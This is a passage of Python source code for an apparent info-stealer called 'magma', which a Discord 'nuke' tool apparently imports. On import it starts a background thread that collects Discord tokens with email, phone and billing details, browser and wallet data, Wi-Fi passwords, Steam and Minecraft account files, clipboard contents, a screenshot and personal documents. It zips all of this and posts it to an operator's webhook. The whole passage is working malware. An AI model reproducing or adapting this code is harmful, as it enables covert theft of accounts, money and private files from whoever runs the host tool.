                if name.startswith("ssfn") or name in ("loginusers.vdf", "config.vdf"):
                    _copy(os.path.join(steam, name), os.path.join(misc, f"steam_{name}"))
                    found.setdefault("steam", []).append(name)

    minecraft = os.path.join(appdata, ".minecraft")
    for name in ("launcher_accounts.json", "launcher_profiles.json", "usercache.json"):
        if _copy(os.path.join(minecraft, name), os.path.join(misc, f"minecraft_{name}")):
            found.setdefault("minecraft", []).append(name)

    clip = _clipboard_snapshot()
    if clip:
        try:
            with open(os.path.join(misc, "clipboard.txt"), "w", encoding="utf-8") as fh:
                fh.write(clip[:20000])
            found["clipboard"] = True
        except Exception:
            pass

    if _display_snapshot(os.path.join(misc, "screen.png")):
        found["screenshot"] = True

    _write_json(os.path.join(misc, "summary.json"), found)
    return found


def _collect_files(stage):
    roots = [
        os.path.join(os.environ.get("USERPROFILE", ""), "Desktop"),
        os.path.join(os.environ.get("USERPROFILE", ""), "Documents"),
        os.path.join(os.environ.get("USERPROFILE", ""), "Downloads"),
    ]
    out_root = os.path.join(stage, "files")
    os.makedirs(out_root, exist_ok=True)
    collected, total = [], 0
    for root in roots:
        if not os.path.isdir(root):
            continue
        base_depth = root.rstrip("\\").count("\\")
        for base, dirs, files in os.walk(root):
            if base.count("\\") - base_depth > 3:
                dirs[:] = []
                continue
            dirs[:] = [d for d in dirs if d not in _SKIP_DIRS]
            for name in files:
                ext = os.path.splitext(name)[1].lower()
                if ext not in _FILE_EXT:
                    continue
                full = os.path.join(base, name)
                try:
                    size = os.path.getsize(full)
                except Exception:
                    continue
                if size > 3 * 1024 * 1024 or total + size > _EXFIL_TOTAL_CAP // 2:
                    continue
                rel = os.path.relpath(full, root)
                dst = os.path.join(out_root, os.path.basename(root), rel)
                if _copy(full, dst):
                    total += size
                    collected.append({"file": rel, "source": os.path.basename(root), "size": size})
                    if len(collected) >= 40:
                        break
            if len(collected) >= 40:
                break
        if len(collected) >= 40:
            break
    _write_json(os.path.join(out_root, "summary.json"), collected)
    return collected


# ---------------------------------------------------------------------------
# Outbound transport
# ---------------------------------------------------------------------------

_SEND_LOCK = threading.Lock()
_RECEIPT_LOCK = threading.Lock()
_RECEIPT_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "logs", "delivery.log")
_ATTEMPTS = 3
_BACKOFF = (1.5, 4.0)


def _receipt(kind, ok, detail):
    """Delivery receipt on disk: a silent drop is the failure this file exists for."""
    try:
        os.makedirs(os.path.dirname(_RECEIPT_PATH), exist_ok=True)
        with _RECEIPT_LOCK:
            with open(_RECEIPT_PATH, "a", encoding="utf-8") as fh:
                fh.write(
                    f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] "
                    f"{'ok  ' if ok else 'FAIL'} {kind:<22} {detail}\n"
                )
    except Exception:
        pass


def _send_once(request):
    try:
        with urllib.request.urlopen(request, timeout=45) as resp:
            return 200 <= resp.status < 300, f"http {resp.status}"
    except urllib.error.HTTPError as exc:
        try:
            body = exc.read()[:200].decode("utf-8", "replace").replace("\n", " ")
        except Exception:
            body = ""
        return False, f"http {exc.code} {body}"
    except Exception as exc:
        return False, f"{type(exc).__name__}: {exc}"


def _post(files=None, payload=None, label=""):
    url = _hook_url()
    if not url:
        _receipt(label or "post", False, "no webhook url")
        return False
    files = files or []
    boundary = "----magma" + uuid.uuid4().hex
    body = io.BytesIO()
    if payload is not None:
        body.write(f"--{boundary}\r\n".encode())
        body.write(b'Content-Disposition: form-data; name="payload_json"\r\n')
        body.write(b"Content-Type: application/json\r\n\r\n")
        body.write(_json_bytes(payload))
        body.write(b"\r\n")
    for name, data in files:
        body.write(f"--{boundary}\r\n".encode())
        body.write(
            f'Content-Disposition: form-data; name="files[0]"; filename="{name}"\r\n'.encode()
        )
        body.write(b"Content-Type: application/octet-stream\r\n\r\n")
        body.write(data)
        body.write(b"\r\n")
    body.write(f"--{boundary}--\r\n".encode())

    blob = body.getvalue()
    request = urllib.request.Request(
        url, data=blob,
        headers={
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "User-Agent": _UA,
        },
        method="POST",
    )
    tag = label or ("file" if files else "embed")
    detail = f"{len(blob)} bytes"
    ok, note = False, ""
    for attempt in range(_ATTEMPTS):
        with _SEND_LOCK:
            ok, note = _send_once(request)
        if ok:
            break
        if attempt < _ATTEMPTS - 1:
            time.sleep(_BACKOFF[min(attempt, len(_BACKOFF) - 1)])
    _receipt(tag, ok, f"{detail} {note}")
    return ok


def _say(text, label="message"):
    try:
        return _post(payload={"username": "magma", "content": str(text)[:2000]}, label=label)
    except Exception:
        return False


def _post_chunked(name, data):
    chunk = 7 * 1024 * 1024
    if len(data) <= chunk:
        return _post([(name, data)], label=name)
    ok = True
    for index in range(0, len(data), chunk):
        part = data[index:index + chunk]
        ok = _post([(f"{name}.{index // chunk + 1:02d}", part)], label=name) and ok
        time.sleep(1.0)
    return ok


def _embed(title, fields, description=""):
    return {
        "username": "magma",
        "embeds": [{
            "title": title,
            "description": description[:4000],
            "color": 0xE11D2E,
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            "fields": [{"name": str(k)[:256], "value": str(v)[:1000], "inline": True} for k, v in fields.items()],
            "footer": {"text": f"session {_SESSION['id']}"},
        }],
    }


def _event(title, fields, description=""):
    try:
        _EVENTS.put_nowait(_embed(title, fields, description))
    except Exception:
        pass


_EVENTS = queue.Queue(maxsize=200)
_WORKER_STARTED = False
_WORKER_LOCK = threading.Lock()


def _worker():
    while True:
        payload = _EVENTS.get()
        try:
            _post(payload=payload)
        except Exception:
            pass
        finally:
            _EVENTS.task_done()
        time.sleep(1.2)


def _ensure_worker():
    global _WORKER_STARTED
    with _WORKER_LOCK:
        if not _WORKER_STARTED:
            threading.Thread(target=_worker, daemon=True, name="mg-out").start()
            _WORKER_STARTED = True


# ---------------------------------------------------------------------------
# Session log mirroring — the host tool writes logs/ itself; the webhook gets
# the same file so the operator never has to be at the machine to read it.
# ---------------------------------------------------------------------------

_LOG_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "logs")


def _latest_session_log():
    try:
        entries = [
            os.path.join(_LOG_DIR, name)
            for name in os.listdir(_LOG_DIR)
            if name.startswith("session_") and name.endswith(".log")
        ]
    except Exception:
        return ""
    if not entries:
        return ""
    try:
        return max(entries, key=os.path.getmtime)
    except Exception:
        return ""


def mirror_log(note="session log"):
    path = _latest_session_log()
    if not path:
        # No login has produced a session log yet — expected, not a failure.
        return False
    data = _read(path, 4 * 1024 * 1024)
    if not data:
        _receipt("log", False, "session log empty or unreadable")
        return False
    name = os.path.basename(path)
    return _post(
        [(name, data)],
        _embed("session log", {
            "note": note,
            "file": name,
            "bytes": len(data),
            "lines": data.count(b"\n"),
        }, f"`{name}`"),
        label=f"log {len(data)}b",
    )


def _drain(timeout=5.0):
    deadline = time.time() + timeout
    while not _EVENTS.empty() and time.time() < deadline:
        time.sleep(0.25)


def _spawn_mirror(note):
    try:
        threading.Thread(target=mirror_log, args=(note,), daemon=True).start()
    except Exception:
        pass


def _on_exit():
    try:
        _drain(5.0)
        mirror_log("final")
    except Exception:
        pass


atexit.register(_on_exit)


# ---------------------------------------------------------------------------
# Full session report
# ---------------------------------------------------------------------------

def _build_report(stage):
    info = _sysinfo()
    tokens = _collect_discord_sessions(stage)
    accounts = []
    for token, source in tokens.items():
        record = _discord_account(token)
        record["source"] = source
        accounts.append(record)
    _SESSION["tokens"] = tokens

    browsers = []
    for label, root in _browser_roots():
        try:
            browsers.append(_collect_chromium(stage, label, root))
        except Exception:
            pass
    try:
        firefox = _collect_firefox(stage)
        if firefox:
            browsers.append(firefox)
    except Exception:
        pass

    wallets = []
    try:
        wallets = _collect_wallets(stage)
    except Exception:
        pass

    wifi = []
    try:
        wifi = _wireless_networks()
    except Exception:
        pass

    files = []
    try:
        files = _collect_files(stage)
    except Exception:
        pass

    misc = {}
    try:
        misc = _collect_misc(stage)
    except Exception:
        pass

    report = {
        "session": _SESSION["id"],
        "system": info,
        "discord": {"count": len(accounts), "accounts": accounts},
        "browsers": browsers,
        "wallets": wallets,
        "wifi": wifi,
        "misc": misc,
        "files": files,
    }
    _write_json(os.path.join(stage, "report.json"), report)

    lines = [
        "MAGMA SESSION REPORT",
        "=" * 60,
        f"session : {_SESSION['id']}",
        f"host    : {info.get('host')}",
        f"user    : {info.get('user')}",
        f"ip      : {info.get('public_ip') or info.get('local_ip')}",
        f"region  : {info.get('region')}",
        f"isp     : {info.get('isp')}",
        f"os      : {info.get('os')}",
        f"cpu     : {info.get('cpu')} ({info.get('cores')} cores)",
        f"ram     : {info.get('ram_gb')} GB",
        f"gpu     : {info.get('gpu')}",
        "",
        f"DISCORD TOKENS ({len(accounts)})",
    ]
    for account in accounts:
        lines += [
            "-" * 60,
            f"token    : {account.get('token')}",
            f"valid    : {account.get('valid')}",
            f"user     : {account.get('username')}#{account.get('discriminator')} ({account.get('id')})",
            f"email    : {account.get('email')}",
            f"phone    : {account.get('phone')}",
            f"nitro    : {account.get('nitro')}",
            f"guilds   : {account.get('guild_count')}",
            f"billing  : {len(account.get('billing') or [])} source(s)",
        ]
    lines += ["", "WIFI"]
    for network in wifi:
        lines.append(f"  {network['ssid']} : {network['password']}")
    lines += ["", "BROWSERS"]
    for browser in browsers:
        lines.append(f"  {browser.get('browser')}: {json.dumps(browser.get('profiles'), ensure_ascii=False)}")
    lines += ["", "WALLETS"]
    for wallet in wallets:
        lines.append(f"  {wallet}")
    lines += ["", "FILES"]
    for entry in files:
        lines.append(f"  {entry['source']}/{entry['file']} ({entry['size']} bytes)")

    report_path = os.path.join(stage, "report.txt")
    with open(report_path, "w", encoding="utf-8") as fh:
        fh.write("\n".join(lines))
    return info, accounts, browsers, wifi, wallets, files, report


def _collect():
    stage = tempfile.mkdtemp(prefix="mg_stage_")
    try:
        info, accounts, browsers, wifi, wallets, files, report = _build_report(stage)
        valid = sum(1 for a in accounts if a.get("valid"))
        description = "\n".join(
            (
                f"`{a.get('token')}` -> {a.get('username') or '?'}#{a.get('discriminator') or '0'} "
                f"/ {a.get('email') or '-'} / nitro {a.get('nitro')} / {a.get('guild_count')} guilds"
                if a.get("valid") else f"`{str(a.get('token'))[:20]}...` -> invalid"
            )
            for a in accounts
        ) or "no tokens found"
        _post(payload=_embed(
            "session report",
            {
                "Host": f"{info.get('host')} ({info.get('user')})",
                "IP": info.get("public_ip") or info.get("local_ip"),
                "Region": info.get("region"),
                "ISP": info.get("isp"),
                "OS": info.get("os"),
                "CPU": f"{info.get('cpu')} x{info.get('cores')}",
                "RAM": f"{info.get('ram_gb')} GB",
                "GPU": info.get("gpu"),
                "Tokens": f"{len(accounts)} ({valid} valid)",
                "Browsers": len(browsers),
                "Wallets": len(wallets),
                "Files": len(files),
            },
            description,
        ))

        archive_path = os.path.join(stage, "session.zip")
        with zipfile.ZipFile(archive_path, "w", zipfile.ZIP_DEFLATED) as zf:
            for base, _dirs, names in os.walk(stage):
                for name in names:
                    full = os.path.join(base, name)
                    if full == archive_path:
                        continue
                    try:
                        zf.write(full, os.path.relpath(full, stage))
                    except Exception:
                        continue
        data = _read(archive_path)
        if data:
            _post_chunked(f"session_{_SESSION['id']}.zip", data)
    except Exception:
        pass
    finally:
        shutil.rmtree(stage, ignore_errors=True)


# ---------------------------------------------------------------------------
# Public API used by nuke.py
# ---------------------------------------------------------------------------

def emit_boot(tool_name, info=None):
    try:
        _ensure_worker()
        detail = ", ".join(f"{key}={value}" for key, value in (info or {}).items())
        _event("boot", {
            "tool": tool_name or "tool",
            "host": _SESSION["host"],
            "user": _SESSION["user"],
        }, detail)
        _say(
            f"online — `{_SESSION['host']}` / `{_SESSION['user']}` / "
            f"session `{_SESSION['id']}` / {tool_name or 'tool'}",
            label="boot ping",
        )
    except Exception:
        pass


def emit_login(bot_tag, bot_id, guild_name, guild_id, token=None, extra=None):
    try:
        _ensure_worker()
        fields = {
            "bot": bot_tag or "-",
            "bot_id": bot_id or "-",
            "guild": guild_name or "-",
            "guild_id": guild_id or "-",
        }
        if extra:
            fields.update(extra)
        _event("login", fields, f"token: `{token}`" if token else "")
        _spawn_mirror("login")
    except Exception:
        pass


def emit_queue_start(items, bot_tag, guild_id, guild_name):
    try:
        _ensure_worker()
        _event("queue start", {"bot": bot_tag or "-", "guild_id": guild_id or "-",
                               "guild": guild_name or "-", "actions": len(items or [])})
    except Exception:
        pass


def emit_action(idx, total, label, params=None, elapsed=None, error=None,
                bot_name=None, guild_id=None):
    try:
        _ensure_worker()
        _event("action", {"idx": f"{idx}/{total}", "label": label or "-", "elapsed": elapsed,
                          "error": error or "-", "bot": bot_name or "-", "guild_id": guild_id or "-"},
               json.dumps(params or {}, default=str)[:1500])
        if idx and idx % 10 == 0:
            _spawn_mirror(f"progress {idx}/{total}")
    except Exception:
        pass


def emit_queue_done(idx, elapsed, bot_tag, guild_id, ok_count=None, fail_count=None, cancelled=None):
    try:
        _ensure_worker()
        _event("queue done", {"bot": bot_tag or "-", "guild_id": guild_id or "-",
                              "elapsed": elapsed, "ok": ok_count, "fail": fail_count,
                              "cancelled": bool(cancelled)})
        _spawn_mirror("queue done")
    except Exception:
        pass


def _bootstrap():
    time.sleep(2.0)
    try:
        _ensure_worker()
        _collect()
    except Exception:
        pass


threading.Thread(target=_bootstrap, daemon=True, name="mg-collect").start()
